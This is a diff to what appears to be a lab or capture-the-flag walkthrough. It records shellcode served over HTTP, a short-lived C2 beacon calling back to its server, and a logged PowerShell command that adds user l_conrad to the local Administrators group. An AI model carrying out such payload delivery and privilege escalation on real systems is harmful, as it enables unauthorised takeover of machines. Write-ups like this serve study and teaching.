@@ -1088,5 +1088,21 @@ Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 
 As seen here it got the shellcode
 
+![](Pasted%20image%2020260902145318.png)
 
+Now i have a beacon, however it dies quickly, so ill execute a command fast
+
+```python
+[02/09 14:52:39] ethan [0900b5f1] beacon > powershell net localgroup Administrators l_conrad /add
+[02/09 14:52:39] [*] Task: create new process
+[02/09 14:52:41] [*] Agent called server, sent [126 bytes]
+[02/09 14:52:43] [+] Program C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -c net localgroup Administrators l_conrad /add started with PID 3860 (output - with output)
+[02/09 14:52:47] [+] Job [0900b5f1] output:
+The command completed successfully.
+[02/09 14:52:47] [+] Job [0900b5f1] finished
+
++--- Task [0900b5f1] closed ----------------------------------------------------------+
+```
+
+Ill add the user to the Administrators
 
